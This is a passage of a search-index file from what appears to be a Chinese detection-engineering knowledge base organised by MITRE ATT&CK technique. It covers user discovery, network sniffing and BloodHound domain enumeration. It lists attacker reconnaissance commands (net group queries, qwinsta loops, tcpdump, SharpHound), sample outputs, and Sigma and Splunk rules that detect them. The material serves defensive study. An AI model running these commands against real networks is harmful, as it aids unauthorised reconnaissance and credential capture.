F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#macos","text":"\u5728Mac\u4e0a\uff0c\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u53ef\u4ee5\u4f7f\u7528users\uff0cw\u548cwho\u6765\u8fdb\u884c\u8bc6\u522b\u3002","title":"MACos"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#linux","text":"\u5728Linux\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528w\u548c\u6807\u8bc6\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237who\u3002","title":"linux"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_1","text":"windows\u76f8\u5173\u547d\u4ee4 - \u67e5\u8be2\u672c\u5730\u7528\u6237\u6743\u9650\uff1awhoami - \u67e5\u8be2\u57df\u7528\u6237\uff1adsquery user\u3001net user /domain - \u67e5\u8be2\u57df\u7ec4\u6743\u9650\uff1anet group /domain - \u67e5\u8be2\u57df\u7ba1\u7406\u5458\uff1anet group \"Domain Admins\" /domain - \u67e5\u770b\u5f53\u524d\u8ba1\u7b97\u673a\u540d\uff0c\u5168\u540d\uff0c\u7528\u6237\u540d\uff0c\u7cfb\u7edf\u7248\u672c\uff0c\u5de5\u4f5c\u7ad9\u57df\uff0c\u767b\u9646\u57df\uff1anet config Workstation - \u67e5\u770b\u57df\u63a7\u5236\u5668\uff1anet group \"Domain controllers\" \uff08\u591a\u57df\u63a7\u5236\u5668\u7684\u65f6\u5019,\u800c\u4e14\u53ea\u80fd\u7528\u5728\u57df\u63a7\u5236\u5668\u4e0a\uff09 - \u67e5\u8be2\u6240\u6709\u8ba1\u7b97\u673a\u540d\u79f0\uff1anet group \"Domain Computers\" /domain\uff08\u57df\u63a7\u4e0d\u4f1a\u88ab\u5217\u51fa\uff09 linux who\u547d\u4ee4","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7 linux history","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#windows_1","text":"Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Windows\\system32>whoami icbc\\administrator","title":"windows\u6d4b\u8bd5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#linux_1","text":"icbc@icbc:~$ who icbc :0 2019-11-10 18:58 (:0) icbc@icbc:~$ w 19:03:14 up 5 min, 1 user, load average: 0.08, 0.51, 0.31 USER TTY \u6765\u81ea LOGIN@ IDLE JCPU PCPU WHAT icbc :0 :0 18:58 ?xdm? 35.66s 0.02s /usr/lib/gdm3/g","title":"linux\u6d4b\u8bd5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7 4688 linux history\u65e5\u5fd7","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#sigma","text":"title: \u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0 description: windows server 2016/Ubuntu19.04 references: - https://attack.mitre.org/techniques/T1033/ - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1033/T1033.md tags: T1033 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 CommandLine: - cmd.exe /C whoami - wmic useraccount get /ALL - quser /SERVER:\"#{computer_name}\" - quser - qwinsta.exe /server:#{computer_name} - qwinsta.exe - for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt - @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt condition: selection level: low logsource: product: linux service: history detection: keywords: - w - who - users condition: keywords level: low","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1033 https://attack.mitre.org/techniques/T1033/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/","text":"T1040-linux-\u7f51\u7edc\u55c5\u63a2 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u7f51\u7edc\u55c5\u63a2\u662f\u6307\u4f7f\u7528\u7cfb\u7edf\u4e0a\u7684\u7f51\u7edc\u63a5\u53e3\u6765\u76d1\u89c6\u6216\u6355\u83b7\u901a\u8fc7\u6709\u7ebf\u6216\u65e0\u7ebf\u8fde\u63a5\u53d1\u9001\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u7f51\u7edc\u63a5\u53e3\u7f6e\u4e8e\u6df7\u6742\u6a21\u5f0f\u4ee5\u901a\u8fc7\u7f51\u7edc\u88ab\u52a8\u5730\u8bbf\u95ee\u4f20\u8f93\u4e2d\u7684\u6570\u636e\uff0c\u6216\u8005\u4f7f\u7528\u8de8\u63a5\u7aef\u53e3\u6765\u6355\u83b7\u66f4\u5927\u91cf\u7684\u6570\u636e\u3002 \u901a\u8fc7\u8be5\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u7684\u6570\u636e\u5305\u62ec\u7528\u6237\u51ed\u8bc1\uff0c\u5c24\u5176\u662f\u901a\u8fc7\u4e0d\u5b89\u5168\u7684\u672a\u52a0\u5bc6\u534f\u8bae\u53d1\u9001\u7684\u51ed\u8bc1\uff1b\u7f51\u7edc\u55c5\u63a2\u8fd8\u53ef\u4ee5\u83b7\u53d6\u5230\u914d\u7f6e\u7ec6\u8282\uff0c\u4f8b\u5982\u8fd0\u884c\u670d\u52a1\uff0c\u7248\u672c\u53f7\u4ee5\u53ca\u540e\u7eed\u6a2a\u5411\u79fb\u52a8\u548c/\u6216\u9632\u5fa1\u9003\u907f\u6d3b\u52a8\u6240\u9700\u7684\u5176\u4ed6\u7f51\u7edc\u7279\u5f81\uff08\u4f8b\u5982\uff1aIP\u5bfb\u5740\uff0c\u4e3b\u673a\u540d\uff0cVLAN ID\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b tcpdump -c 5 -nnni #{\u7f51\u5361\u63a5\u53e3} tshark -c 5 -i #{\u7f51\u5361\u63a5\u53e3} \u68c0\u6d4b\u65e5\u5fd7 linux /var/log/message \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542fmessage\u65e5\u5fd7\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff09 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u4e00 root@icbc:~# tcpdump -c 5 -nnni ens33 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 10:37:34.347544 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:37.355725 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:40.356238 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:43.356969 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:49.808569 IP 192.168.66.148.59150 > 192.168.66.2.53: 15476+ [1au] A? connectivity-check.ubuntu.com. (58) 5 packets captured 5 packets received by filter 0 packets dropped by kernel \u573a\u666f\u4e8c root@icbc:~# tshark -c 5 -i ens33 Running as user \"root\" and group \"root\". This could be dangerous. Capturing on 'ens33' 1 0.000000000 192.168.66.148 \u2192 192.168.66.2 DNS 100 Standard query 0xe349 A connectivity-check.ubuntu.com OPT 2 0.038532840 Vmware_e8:11:b3 \u2192 Broadcast ARP 60 Who has 192.168.66.148? Tell 192.168.66.2 3 0.038552195 Vmware_02:d5:c7 \u2192 Vmware_e8:11:b3 ARP 42 192.168.66.148 is at 00:0c:29:02:d5:c7 4 0.038758293 192.168.66.2 \u2192 192.168.66.148 DNS 132 Standard query response 0xe349 A connectivity-check.ubuntu.com A 35.224.99.156 A 35.222.85.5 OPT 5 0.039670671 192.168.66.148 \u2192 35.222.85.5 TCP 74 57812 \u2192 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=136575048 TSecr=0 WS=128 5 packets captured \u6d4b\u8bd5\u7559\u75d5 \u573a\u666f1 message\u65e5\u5fd7 Jul 19 10:37:33 icbc kernel: [ 298.396406] device ens33 entered promiscuous mode \u573a\u666f2 message\u65e5\u5fd7 Jul 19 10:47:42 icbc systemd[1]: Started Cleanup of Temporary Directories. Jul 19 10:47:50 icbc kernel: [ 915.199848] device ens33 left promiscuous mode Jul 19 10:47:50 icbc start.sh[734]: 2019-07-19 10:47:50,165: DEBUG helpers.application.health RAM: 65MB \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u68c0\u6d4b\u89c4\u5219 index=linux sourcetype=syslog entered promiscuous mode | table host,message index=linux sourcetype=syslog left promiscuous mode | table host,message \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1040 https://attack.mitre.org/techniques/T1040/","title":"T1040-linux-\u7f51\u7edc\u55c5\u63a2"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#t1040-linux-","text":"","title":"T1040-linux-\u7f51\u7edc\u55c5\u63a2"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#attck","text":"\u7f51\u7edc\u55c5\u63a2\u662f\u6307\u4f7f\u7528\u7cfb\u7edf\u4e0a\u7684\u7f51\u7edc\u63a5\u53e3\u6765\u76d1\u89c6\u6216\u6355\u83b7\u901a\u8fc7\u6709\u7ebf\u6216\u65e0\u7ebf\u8fde\u63a5\u53d1\u9001\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u7f51\u7edc\u63a5\u53e3\u7f6e\u4e8e\u6df7\u6742\u6a21\u5f0f\u4ee5\u901a\u8fc7\u7f51\u7edc\u88ab\u52a8\u5730\u8bbf\u95ee\u4f20\u8f93\u4e2d\u7684\u6570\u636e\uff0c\u6216\u8005\u4f7f\u7528\u8de8\u63a5\u7aef\u53e3\u6765\u6355\u83b7\u66f4\u5927\u91cf\u7684\u6570\u636e\u3002 \u901a\u8fc7\u8be5\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u7684\u6570\u636e\u5305\u62ec\u7528\u6237\u51ed\u8bc1\uff0c\u5c24\u5176\u662f\u901a\u8fc7\u4e0d\u5b89\u5168\u7684\u672a\u52a0\u5bc6\u534f\u8bae\u53d1\u9001\u7684\u51ed\u8bc1\uff1b\u7f51\u7edc\u55c5\u63a2\u8fd8\u53ef\u4ee5\u83b7\u53d6\u5230\u914d\u7f6e\u7ec6\u8282\uff0c\u4f8b\u5982\u8fd0\u884c\u670d\u52a1\uff0c\u7248\u672c\u53f7\u4ee5\u53ca\u540e\u7eed\u6a2a\u5411\u79fb\u52a8\u548c/\u6216\u9632\u5fa1\u9003\u907f\u6d3b\u52a8\u6240\u9700\u7684\u5176\u4ed6\u7f51\u7edc\u7279\u5f81\uff08\u4f8b\u5982\uff1aIP\u5bfb\u5740\uff0c\u4e3b\u673a\u540d\uff0cVLAN ID\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_1","text":"tcpdump -c 5 -nnni #{\u7f51\u5361\u63a5\u53e3} tshark -c 5 -i #{\u7f51\u5361\u63a5\u53e3}","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_2","text":"linux /var/log/message \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542fmessage\u65e5\u5fd7\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_4","text":"root@icbc:~# tcpdump -c 5 -nnni ens33 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 10:37:34.347544 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:37.355725 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:40.356238 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:43.356969 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:49.808569 IP 192.168.66.148.59150 > 192.168.66.2.53: 15476+ [1au] A? connectivity-check.ubuntu.com. (58) 5 packets captured 5 packets received by filter 0 packets dropped by kernel","title":"\u573a\u666f\u4e00"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_5","text":"root@icbc:~# tshark -c 5 -i ens33 Running as user \"root\" and group \"root\". This could be dangerous. Capturing on 'ens33' 1 0.000000000 192.168.66.148 \u2192 192.168.66.2 DNS 100 Standard query 0xe349 A connectivity-check.ubuntu.com OPT 2 0.038532840 Vmware_e8:11:b3 \u2192 Broadcast ARP 60 Who has 192.168.66.148? Tell 192.168.66.2 3 0.038552195 Vmware_02:d5:c7 \u2192 Vmware_e8:11:b3 ARP 42 192.168.66.148 is at 00:0c:29:02:d5:c7 4 0.038758293 192.168.66.2 \u2192 192.168.66.148 DNS 132 Standard query response 0xe349 A connectivity-check.ubuntu.com A 35.224.99.156 A 35.222.85.5 OPT 5 0.039670671 192.168.66.148 \u2192 35.222.85.5 TCP 74 57812 \u2192 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=136575048 TSecr=0 WS=128 5 packets captured","title":"\u573a\u666f\u4e8c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_6","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#1","text":"message\u65e5\u5fd7 Jul 19 10:37:33 icbc kernel: [ 298.396406] device ens33 entered promiscuous mode","title":"\u573a\u666f1"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#2","text":"message\u65e5\u5fd7 Jul 19 10:47:42 icbc systemd[1]: Started Cleanup of Temporary Directories. Jul 19 10:47:50 icbc kernel: [ 915.199848] device ens33 left promiscuous mode Jul 19 10:47:50 icbc start.sh[734]: 2019-07-19 10:47:50,165: DEBUG helpers.application.health RAM: 65MB","title":"\u573a\u666f2"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#splunk","text":"index=linux sourcetype=syslog entered promiscuous mode | table host,message index=linux sourcetype=syslog left promiscuous mode | table host,message","title":"splunk\u68c0\u6d4b\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_8","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_9","text":"MITRE-ATT&CK-T1040 https://attack.mitre.org/techniques/T1040/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/","text":"T1049/1069-bloodhound\u4f7f\u7528 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 T1049:\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u67e5\u8be2\u7f51\u7edc\u4e0a\u7684\u4fe1\u606f\u6765\u5c1d\u8bd5\u83b7\u53d6\u4e0e\u4ed6\u4eec\u5f53\u524d\u6b63\u5728\u8bbf\u95ee\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u4e4b\u95f4\u6216\u4ece\u8fdc\u7a0b\u7cfb\u7edf\u83b7\u5f97\u7684\u7f51\u7edc\u8fde\u63a5\u7684\u5217\u8868\u3002 T1069:\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u672c\u5730\u7cfb\u7edf\u6216\u57df\u7ea7\u522b\u7684\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002 \u6d4b\u8bd5\u6848\u4f8b BloodHound\u662f\u4e00\u79cd\u5355\u9875\u7684JavaScript\u7684Web\u5e94\u7528\u7a0b\u5e8f\uff0c\u6784\u5efa\u5728Linkurious\u4e0a\uff0c\u7528Electron\u7f16\u8bd1\uff0cNEO4J\u6570\u636e\u5e93\u662fPowerShell/C# ingestor. BloodHound\u4f7f\u7528\u53ef\u89c6\u5316\u56fe\u6765\u663e\u793aActive Directory\u73af\u5883\u4e2d\u9690\u85cf\u7684\u548c\u76f8\u5173\u8054\u7684\u4e3b\u673a\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528BloodHound\u8f7b\u677e\u8bc6\u522b\u9ad8\u5ea6\u590d\u6742\u7684\u653b\u51fb\u8def\u5f84\uff0c\u5426\u5219\u5f88\u96be\u5feb\u901f\u8bc6\u522b\u3002\u9632\u5fa1\u8005\u53ef\u4ee5\u4f7f\u7528BloodHound\u6765\u8bc6\u522b\u548c\u9632\u5fa1\u90a3\u4e9b\u76f8\u540c\u7684\u653b\u51fb\u8def\u5f84\u3002\u84dd\u961f\u548c\u7ea2\u961f\u90fd\u53ef\u4ee5\u4f7f\u7528BloodHound\u8f7b\u677e\u6df1\u5165\u4e86\u89e3Active Directory\u73af\u5883\u4e2d\u7684\u6743\u9650\u5173\u7cfb\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 SharpHound.exe -c ALL \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7\u30015145 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Bloodhound and Sharphound Hack Tool description: Detects command line parameters used by Bloodhound and Sharphound hack tools references: - https://github.com/BloodHoundAD/BloodHound - https://github.com/BloodHoundAD/SharpHound tags: - attack.discovery - attack.t1049 logsource: category: process_creation product: windows detection: selection1: Image|contains: - '\\Bloodhound.exe' - '\\SharpHound.exe' selection2: CommandLine|contains: - ' -CollectionMethod All ' - '.exe -c All -d ' - 'Invoke-Bloodhound' - 'Get-BloodHoundData' selection3: CommandLine|contains|all: - ' -JsonFolder ' - ' -ZipFileName ' selection4: CommandLine|contains|all: - ' DCOnly ' - ' --NoSaveCache ' condition: 1 of them falsepositives: - Other programs that use these command line option and accepts an 'All' parameter level: high \u5efa\u8bae \u57fa\u4e8e\u8fdb\u7a0b\u547d\u4ee4\u540d\u79f0\u8fdb\u884c\u68c0\u6d4b\uff0c\u51c6\u786e\u7387\u6781\u4f4e\uff0c\u8c28\u614e\u4f7f\u7528\u68c0\u6d4b\u6761\u4ef61. \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1049 https://attack.mitre.org/techniques/T1049/ MITRE-ATT&CK-T1069 https://attack.mitre.org/techniques/T1069/ bloodhound https://github.com/BloodHoundAD/BloodHound \u57df\u5206\u6790\u795e\u5668 https://www.cnblogs.com/KevinGeorge/p/10513211.html","title":"T1049/1069-bloodhound\u4f7f\u7528"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#t10491069-bloodhound","text":"","title":"T1049/1069-bloodhound\u4f7f\u7528"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#attck","text":"T1049:\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u67e5\u8be2\u7f51\u7edc\u4e0a\u7684\u4fe1\u606f\u6765\u5c1d\u8bd5\u83b7\u53d6\u4e0e\u4ed6\u4eec\u5f53\u524d\u6b63\u5728\u8bbf\u95ee\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u4e4b\u95f4\u6216\u4ece\u8fdc\u7a0b\u7cfb\u7edf\u83b7\u5f97\u7684\u7f51\u7edc\u8fde\u63a5\u7684\u5217\u8868\u3002 T1069:\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u672c\u5730\u7cfb\u7edf\u6216\u57df\u7ea7\u522b\u7684\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_1","text":"BloodHound\u662f\u4e00\u79cd\u5355\u9875\u7684JavaScript\u7684Web\u5e94\u7528\u7a0b\u5e8f\uff0c\u6784\u5efa\u5728Linkurious\u4e0a\uff0c\u7528Electron\u7f16\u8bd1\uff0cNEO4J\u6570\u636e\u5e93\u662fPowerShell/C# ingestor. BloodHound\u4f7f\u7528\u53ef\u89c6\u5316\u56fe\u6765\u663e\u793aActive Directory\u73af\u5883\u4e2d\u9690\u85cf\u7684\u548c\u76f8\u5173\u8054\u7684\u4e3b\u673a\u5185\u5bb9\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528BloodHound\u8f7b\u677e\u8bc6\u522b\u9ad8\u5ea6\u590d\u6742\u7684\u653b\u51fb\u8def\u5f84\uff0c\u5426\u5219\u5f88\u96be\u5feb\u901f\u8bc6\u522b\u3002\u9632\u5fa1\u8005\u53ef\u4ee5\u4f7f\u7528BloodHound\u6765\u8bc6\u522b\u548c\u9632\u5fa1\u90a3\u4e9b\u76f8\u540c\u7684\u653b\u51fb\u8def\u5f84\u3002\u84dd\u961f\u548c\u7ea2\u961f\u90fd\u53ef\u4ee5\u4f7f\u7528BloodHound\u8f7b\u677e\u6df1\u5165\u4e86\u89e3Active Directory\u73af\u5883\u4e2d\u7684\u6743\u9650\u5173\u7cfb\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_3","text":"SharpHound.exe -c ALL","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_4","text":"windows\u5b89\u5168\u65e5\u5fd7\u30015145","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#sigma","text":"title: Bloodhound and Sharphound Hack Tool description: Detects command line parameters used by Bloodhound and Sharphound hack tools references: - https://github.com/BloodHoundAD/BloodHound - https://github.com/BloodHoundAD/SharpHound tags: - attack.discovery - attack.t1049 logsource: category: process_creation product: windows detection: selection1: Image|contains: - '\\Bloodhound.exe' - '\\SharpHound.exe' selection2: CommandLine|contains: - ' -CollectionMethod All ' - '.exe -c All -d ' - 'Invoke-Bloodhound' - 'Get-BloodHoundData' selection3: CommandLine|contains|all: - ' -JsonFolder ' - ' -ZipFileName ' selection4: CommandLine|contains|all: - ' DCOnly ' - ' --NoSaveCache ' condition: 1 of them falsepositives: - Other programs that use these command line option and accepts an 'All' parameter level: high","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_6","text":"\u57fa\u4e8e\u8fdb\u7a0b\u547d\u4ee4\u540d\u79f0\u8fdb\u884c\u68c0\u6d4b\uff0c\u51c6\u786e\u7387\u6781\u4f4e\uff0c\u8c28\u614e\u4f7f\u7528\u68c0\u6d4b\u6761\u4ef61.","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-bloodhound%E4%BD%BF%E7%94%A8/#_7","text":"MITRE-ATT&CK-T1049 https://attack.mitre.org/techniques/T1049/ MITRE-ATT&CK-T1069 https://attack.mitre.org/techniques/T1069/ bloodhound https://github.com/BloodHoundAD/BloodHound \u57df\u5206\u6790\u795e\u5668 https://www.cnblogs.com/KevinGeorge/p/10513211.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1049-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%8E%B0/","text":"T1049-\u7cfb\u7edf\u7f51\u7edc\u8fde\u63a5\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u67e5\u8be2\u7f51\u7edc\u4e0a\u7684\u4fe1\u606f\u6765\u5c1d\u8bd5\u83b7\u53d6\u4e0e\u4ed6\u4eec\u5f53\u524d\u6b63\u5728\u8bbf\u95ee\u7684\u53d7\u611f\u67d3\u7cfb\u7edf\u4e4b\u95f4\u6216\u4ece\u8fdc\u7a0b\u7cfb\u7edf\u83b7\u5f97\u7684\u7f51\u7edc\u8fde\u63a5\u7684\u5217\u8868\u3002 